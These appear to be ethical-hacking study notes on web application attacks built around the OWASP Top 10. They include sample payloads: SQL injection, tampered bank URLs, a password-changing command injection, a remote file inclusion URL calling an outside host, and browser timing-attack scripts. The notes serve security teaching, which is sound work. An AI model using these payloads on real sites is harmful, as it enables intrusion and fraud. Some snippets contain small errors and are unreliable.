## 1. OWASP Top 10 Application Security Risks (2021)
**Source:** [https://owasp.org](https://owasp.org)

OWASP is an international organization that maintains a list of the top 10 vulnerabilities and flaws of web applications.

| Risk | Category | Attacks |
| :--- | :--- | :--- |
| **A01** | Broken Access Control | Directory Traversal, Hidden Field Manipulation |
| **A02** | Cryptographic Failures | Cookie Snooping, RC4 NOMORE Attack, Same-Site Attack, Pass-the-Cookie Attack |
| **A03** | Injection | SQL Injection, Command Injection, LDAP Injection, XSS, Buffer Overflow |
| **A04** | Insecure Design | Business Logic Bypass, Web-Based Timing Attacks, CAPTCHA Attacks, Platform Exploits |
| **A05** | Security Misconfiguration | XML External Entity (XXE) Attack, Unvalidated Redirects & Forwards, Directory Traversal, Hidden Field Manipulation |
| **A06** | Vulnerable & Outdated Components | Platform Exploits, Magecart Attack, Buffer Overflow |
| **A07** | Identification & Authentication Failures | Cross-Site Request Forgery, Cookie/Session Poisoning, Cookie Snooping |
| **A08** | Software & Data Integrity Failures | Insecure Deserialization, Unvalidated Redirects & Forwards, Watering Hole Attack, DoS, Buffer Overflow, Web Service Attacks, Platform Exploits, Magecart Attack |
| **A09** | Security Logging & Monitoring Failures | Web Service Attacks |
| **A10** | Server-Side Request Forgery (SSRF) | Injecting an SSRF Payload, Cross-Site Port Attack (XSPA), DNS Rebinding Attack, H2C Smuggling Attack |

### A01 — Broken Access Control (Detailed)
Access control refers to how a web application grants access to create, update, and delete records/content/functions to privileged users while restricting access to others. Broken access control is a method by which an attacker identifies a flaw, bypasses authentication, and compromises the network.

**Common vulnerabilities (OWASP 2021 R3):**
* Abusing least privileges or denying them by default — everyone gains access to roles/users/abilities instead of having specific accessibility.
* Evading access controls by changing URL, API request, HTML page, or application state via **parameter tampering, force browsing, or attacking tools**.
* Gaining permission to read or modify someone's account through their unique identifier.
* Gaining access to APIs without access controls for PUT, POST, and DELETE.
* **Escalating privileges** — a user can act as an administrator after logging in.
* Manipulating metadata — e.g., manipulation of a **hidden field** or alteration of a **JWT access-control token** or a cookie to exploit JWT invalidation or elevate privileges.
* Accessing API via illegitimate sources exploiting **CORS misconfiguration**.
* **Force browsing** to privileged or authenticated pages as a valid or invalid user.

### A02 — Cryptographic Failures / Sensitive Data Exposure (Detailed)
Web applications need to store sensitive information (passwords, credit-card numbers, account records, authentication information) in a database or file system. If users do not maintain proper security, attackers can access and misuse this information.

* **Root cause:** Flaws such as insecure cryptographic storage and information leakage.
* Although data is encrypted, some cryptographic methods have inherent weaknesses allowing attackers to steal data.
* **Insecure key storage** — if cryptographic keys are stored at insecure locations, attackers retrieve them and decrypt sensitive data.
* **Reused IVs** — initialization vectors (IVs) in encryption algorithms should never be reused.
* **Deprecated hash functions** (MD5, SHA-1) and **deprecated padding methods** (PKCS 1/1.5) should be avoided.
* Organizations must use proper content-filtering mechanisms to prevent information leakage.

### A03 — Injection Flaws (Detailed)
Injection flaws are web application vulnerabilities that allow untrusted data to be interpreted and executed as part of a command or query. Prevalent in legacy code; often found in SQL, LDAP, and XPath queries. Easily discovered by vulnerability scanners and fuzzers.

**Attacker method:** Construct malicious commands or queries that result in:
* Data loss or corruption
* Lack of accountability
* Denial of access

### A07 — Identification & Authentication Failures (Detailed)
Authentication and session management are often implemented incorrectly, allowing attackers to launch brute-forcing, password spraying, and other automated attacks to compromise passwords, keys, or session tokens.

**Attacks:**
* **Cross-Site Request Forgery (CSRF)**
* **Cookie/Session Poisoning**
* **Cookie Snooping**

### A08 — Software & Data Integrity Failures (Detailed)
Many applications implement auto-update features that may download updates from unauthorized or previously trusted sources without conducting sufficient integrity checks. Attackers can load their own updates to distribute malware. If data is encoded/serialized into an easily understandable format, attackers can alter it (**insecure deserialization**).

**Attacks:**
* Insecure Deserialization
* Unvalidated Redirects and Forwards
* **Watering Hole Attack**
* Denial-of-Service (DoS)
* Buffer Overflow
* Web Service Attacks
* Platform Exploits
* Magecart Attack

### A09 — Security Logging & Monitoring Failures (Detailed)
Occur via insufficient log monitoring, local storage of logs, inadequate error messages, inappropriate alert mechanisms for failed-login attempts, or applications failing to identify threats in advance. Can leak sensitive information enabling attackers to compromise systems, tamper with credentials, or destroy data.

**Attacks:** Web Service Attacks

### A10 — Server-Side Request Forgery (SSRF) (Detailed)
A web security vulnerability arising when remote resources are obtained by an application without verifying the URL entered by the user. Attackers abuse server functionalities to read/modify internal resources and steal sensitive information. SSRF also allows sending malicious requests to internal systems even if secured by firewalls.

**Attacks:**
* Injecting an SSRF Payload
* **Cross-Site Port Attack (XSPA)**
* **DNS Rebinding Attack**
* H2C Smuggling Attack

## 2. Unvalidated Inputs

Input validation flaws occur when input from a client is **not validated** before being processed by web applications and backend servers. If only client-side validation is used, attackers can bypass it by tampering with HTTP requests, URLs, headers, form fields, hidden fields, and query strings.

### What Attackers Exploit:
* **Cookies** storing user login IDs and related data become attack vectors.
* Leads to: **XSS, buffer overflow, injection attacks** — resulting in data theft and system malfunction.

---

## 3. Parameter / Form Tampering

A **web parameter tampering attack** involves the manipulation of parameters exchanged between client and server to modify application data such as user credentials, permissions, prices, and quantities.

* Information is stored in **cookies, hidden form fields, or URL query strings**.
* Tools: `WebScarab`, `WebSploit Framework`.

### Example: Hidden Form Field Tampering
```html
<input type="hidden" name="price" value="99.90">
```
An attacker modifies the value (e.g., to `0.01`) to manipulate the purchase price.

### Example: URL Parameter Tampering
```
Original:  http://www.certifiedhackerbank.com/cust.asp?profile=21&debit=2500
Tampered:  http://www.certifiedhackerbank.com/cust.asp?profile=82&debit=1500
```
Attackers can also change access permissions:
```
Original:  http://www.certifiedhackerbank.com/stat.asp?pg=531&status=view
Tampered:  http://www.certifiedhackerbank.com/stat.asp?pg=147&status=delete
```

### Combo Box Bypass
Attackers add extra accounts to the HTML page source code and submit the new account value:
```html
<FORM METHOD=POST ACTION="xferMoney.asp">
  Source Account: <SELECT NAME="SrcAcc">
    <OPTION VALUE="123456789">******789</OPTION>
    <OPTION VALUE="868686868">******868</OPTION>
  </SELECT>
```

### Consequences:
* Theft of services
* Escalation of access
* Session hijacking
* Assuming the identity of other users
* Access to developer debug information

## 4. Improper Error Handling

Improper error handling provides insights into source code — logic flaws and default accounts — that attackers exploit.

### Information Leaked via Errors:
* Null pointer exceptions
* System call failures
* Database unavailability
* Network timeouts
* Database information, schema, version
* Web application logical flow
* Application environment details

> **Impact:** Can lead to DoS attacks. Attackers identify vulnerabilities using the information revealed and launch targeted web application attacks.

## 5. Insufficient Transport Layer Protection

Occurs when an application fails to protect sensitive network traffic. Supports weak algorithms, uses expired/invalid certificates.

### Consequences:
* Data can be intercepted, injected, or redirected.
* An underprivileged SSL setup enables phishing and MITM attacks.
* Account theft, phishing, compromised admin accounts.
* Allows untrusted third parties to obtain unauthorized access to sensitive information.

### Root Causes:
* Supporting weak SSL algorithms.
* Using expired or invalid SSL certificates.
* Failing to correctly implement SSL.

## 6. SQL Injection Attacks

SQL injection attacks use malicious SQL queries or statements to directly manipulate the database. They work because the application **does not properly validate input** before passing it to an SQL statement.

### Example:
```sql
-- Normal query
SELECT * FROM tablename WHERE UserID= 2302

-- SQL Injected query
SELECT * FROM tablename WHERE UserID= 2302 OR 1=1
```
`OR 1=1` evaluates to TRUE — allowing enumeration of all user IDs.

### What Attackers Can Do:
* Log into the application without valid credentials.
* Query data the application would not normally expose.
* Modify database contents or drop the database.
* Use trust relationships between web app components to access other databases.

> **Note:** For complete SQL injection coverage, refer to Module 15: SQL Injection.

## 7. Command Injection Attacks

Allow attackers to pass malicious code to different systems via web applications — operating system calls, shell commands, and backend SQL.

### Types of Command Injection:

| Type | Description |
| :--- | :--- |
| **Shell Injection** | Crafts input to gain shell access. Functions: `system()`, `StartProcess()`, `java.lang.Runtime.exec()`, `System.Diagnostics.Process.Start()`. |
| **HTML Embedding** | Adds extra HTML content to deface websites virtually; user input placed in HTML output without checking for code. |
| **File Injection** | Injects malicious code into system files. |

### Command Injection Example:
```
www.certifiedhacker.com/banner.gif||newpassword||1036|60|468
```
*Changes the password for account 1036 to "newpassword" — the server assumes only a banner image URL was entered.*

## 8. File Injection Attacks

Exploits **"dynamic file include"** mechanisms in web applications. Attackers redirect the application to the location of a malicious file.

### Vulnerable PHP Example:
```php
<?php
  $drink = 'coke';
  if (isset($_GET['DRINK'])) $drink = $_GET['DRINK'];
  require($drink . '.php');
?>
```
### Exploit:
```
http://www.certifiedhacker.com/orders.php?DRINK=http://jasoneval.com/exploit?
```
PHP interprets the file as a script and executes it, allowing arbitrary command execution.

## 9. Session-Based Attacks

### Bypass Authentication: Bypass Multi-Factor Authentication (MFA)
MFA bypass involves circumventing the MFA mechanism to gain unauthorized access.

**Techniques:**
* **HTTP Response Body Manipulation:** If `Success: false` is returned, modify it to `Success: true`.
* **Valid request with incorrect OTP:** Replaying or manipulating OTP requests.

### Pass-the-Cookie Attack
Attackers steal session cookies to impersonate legitimate users.
* Malware implants the attacker's session while the victim browses.
* Tools like **Mimikatz** extract encrypted cookies.

### Same-Site Attack (Related-Domain Attack)
Targets subdomains of a trusted organization to redirect users to attacker-controlled pages.
* Targets misconfigured or abandoned subdomains sharing the legitimate site's TLD.
* Attackers hijack subdomains creating **dangling records** using extended TLDs (eTLDs).
* Same-site attackers can obtain cookies because sites sharing `eTLD+1` domain share cookies.

**Scenario:**
```
User tries to browse: www.certifiedhacker.com
Redirected to:        rans.certifiedhacker.com  (attacker-controlled dangling site)
```
*The malicious link shares a common domain name, luring the user into trusting it.*

## 11. Cross-Site Request Forgery (CSRF)

CSRF exploits an authenticated user's trust to pass malicious commands to a trusted website. Tricks the victim into submitting a malicious request using the victim's authenticated session.

## 12. Denial-of-Service (DoS) Attacks

Reduces, restricts, or prevents legitimate users from accessing system resources. Examples: banking or email websites unable to function for hours or days, resulting in time and money loss.

## 13. Web-Based Timing Attacks

Attacks that extract sensitive information (e.g., passwords) by **measuring server response times**. Exploit side-channel leakage.

### Types:

#### 1. Direct Timing Attack
Measures the approximate time taken by the server to process a POST request.
* Deduces the existence of a username based on response time.
* Performs character-by-character password examination using timing data.

#### 2. Cross-Site Timing Attack
Uses malicious JavaScript to send crafted request packets to a website.
```javascript
function getMeasurement(url, callback) {
  var a = new Image();
  a.addEventListener('error', function() {
    var conclude = performance.now();
    callback(conclude - begin);
  });
  var begin = performance.now();
  a.src = url;
}

getMeasurement('http://xyz.com/the-prompt/', function(timeTF) {
  getMeasurement('http://xyz.com/the-anonymous-place', function(timeTDS) {
    if (timeTF > timeTDS) {
      alert('The prompt is alright!');
    } else {
      alert('Privacy breach!');
    }
  });
});
```

#### 3. Browser-Based Timing Attacks
Sophisticated side-channel attacks exploiting browser-side leaks.

* **Video Parsing Attack:** Measures time for browser to parse requested resource as video.
```javascript
function getMeasurement(url, callback) {
  var p = document.createElement('video');
  var begin;
  p.addEventListener('suspend', function() { begin = performance.now(); });
  p.addEventListener('error', function() {
    var conclude = performance.now();
    callback(conclude - begin);
  });
  p.src = url;
}
```

* **Cache Storage Timing Attack:** Measures time to load resources into browser's Cache API.
```javascript
function getMeasurement(url, callback) {
  fetch(url, {mode: "no-cors", credentials: "include"}).then(function(resp) {
    setTimeout(function() {
      caches.open('attackerfile').then(function(cache) {
        var begin = performance.now();
        cache.put(new request('myfoo'), resp.clone()).then(function() {
          var conclude = performance.now();
          callback(conclude - begin);
        });
      });
    }, 2000);
  });
}
```

## 14. XML External Entity (XXE) Attack

An **SSRF-type attack** where an application parses XML input from an unreliable source because of a misconfigured XML parser.

### How It Works:
1. Attacker sends malicious XML input containing a reference to an external entity.
2. The weakly configured XML parser processes this input.
3. The parser accesses protected files and services from servers or connected networks.

### What Attackers Can Do:
* Retrieve confidential data.
* Perform DoS attacks.
* Obtain sensitive information via HTTP(S).
* Remote code execution.
* Launch a CSRF attack on any vulnerable service.

> According to the XML 1.0 standard, XML uses **entities** (storage units) that can access local or remote contents via **system identifiers (URIs)**. The XML parser replaces entities with their actual data — attackers exploit this by forcing the parser to access attacker-specified files.

## 15. Unvalidated Redirects & Forwards

**Unvalidated redirects** enable attackers to install malware or trick victims into disclosing passwords. **Unsafe forwards** allow access control bypass.

### Attack Scenarios:
* Attacker sends malicious links containing unvalidated redirects to lure victims.
* Victims click, thinking the link leads to a valid site, but are redirected to a malicious page.

### Types of Access Control Bypass via Unsafe Forwards:
1. **Session Fixation Attack:** Attacker tricks or attracts a user to access a legitimate web server using an explicit session ID value.
2. **Security Management Exploits:** Attackers target security management systems to modify or disable security enforcement.

## 16. Clickjacking

Tricks users into clicking on malicious content disguised as legitimate UI elements. Uses **invisible iframes** positioned over legitimate content.

### Clickjacking Techniques:

| Technique | Description |
| :--- | :--- |
| **Likejacking** | Manipulates Facebook's "Like" button — loads an invisible iframe over a page so user unknowingly "Likes" the attacker's page. |
| **Cursorjacking** | Replaces the legitimate cursor with a fake cursor shifted a few pixels, causing the victim to click on unintended elements. |
| **Cookiejacking** | Tricks the victim into dragging an object that embeds session cookies, allowing theft of entire cookies. |
| **Filejacking** | Gains access to the victim's file system via an open file-sharing server when clicking malicious links. |
| **Content Replacement** | Overlays the entire legitimate page with a transparent malicious page with a high z-index. |
| **Cropping** | Only selected controls from the transparent page are overlaid; masking buttons with hyperlinks. |
| **Hidden Overlay** | 1×1 pixel iframe placed secretly under the mouse cursor — click registers on hidden malicious page. |
| **Click Event Dropping** | Sets CSS `pointer-events: none` on the masked page so click events "drop through" to the malicious page. |
| **Rapid Content Replacement** | Opaque overlays removed momentarily to register a click — requires prediction of victim's click timing. |

## 17. MarioNet Attack

A **browser-based attack** that runs malicious code inside the browser. Infection **persists even after closing or browsing away** from the malicious page.

### How It Works:
1. Attacker controls a website and registers the **Service Workers API**.
2. When victim visits that website, Service Workers activate automatically.
3. Service Workers run persistently in the background — even when the user leaves.
4. Attacker abuses the **SyncManager interface** to keep Service Workers alive.
5. Infection can resist tab crashes and power failures.

### What MarioNet Can Do:
* Create a **botnet** of abused browsers.
* **Cryptojacking** — mine cryptocurrency using victim's resources.
* **DDoS attacks.**
* **Click fraud.**
* **Distributed password cracking.**
* Inject malicious code into high-traffic websites.
* Retrieve sensitive information (credentials).
* Control abused browsers from a central server.

## 18. Other Web Application Attacks

| Attack | Description |
| :--- | :--- |
| **Cookie Snooping** | Analyzing victims' cookies to learn surfing habits; sell info or launch further attacks. |
| **RC4 NOMORE Attack** | *(Rivest Cipher Numerous Occurrence MOnitoring and Recovery Exploit)* — Targets servers using RC4 encryption; decrypts HTTPS-secured cookies and injects arbitrary packets to impersonate victims. |
| **Buffer Overflow** | Occurs when a web application fails to guard its buffer — allows writing beyond the maximum buffer size. |
| **Business Logic Bypass** | Manipulates the application's normal workflow or business rules to achieve unauthorized access, data leakage, or fraud. |
| **CAPTCHA Attacks** | Exploits CAPTCHA implementations designed to distinguish humans from bots. |
| **Platform Exploits** | Exploits vulnerabilities in web app platforms such as BEA WebLogic and ColdFusion. |
| **H2C Smuggling Attack** | Exploits HTTP/2 over TCP (H2C) handling — misleads security controls and can cause cache poisoning, access control bypass, or unauthorized access. |
| **JavaScript Hijacking (JSON Hijacking)** | Exploits flaws in the browser's same-origin policy to capture sensitive JSON data. |
| **Cross-Site WebSocket Hijacking (CSWH)** | Attacker establishes a WebSocket connection using a victim's identity — possible when WebSocket handshake uses HTTP cookies without CSRF tokens. |
| **Obfuscation Application** | Encodes attack payloads using Unicode, UTF-8, Base64, or URL encoding to evade IDS/IPS. |
| **Network Access Attacks** | Affect web applications by granting levels of access that standard HTTP cannot. |
| **DMZ Protocol Attacks** | Compromises a system in the DMZ to gain access to other DMZ hosts and internal systems — can lead to website defacement, database access, and source code theft. |
| **Magecart Attack** | Injects malicious JavaScript into e-commerce pages to skim credit card data at checkout. |
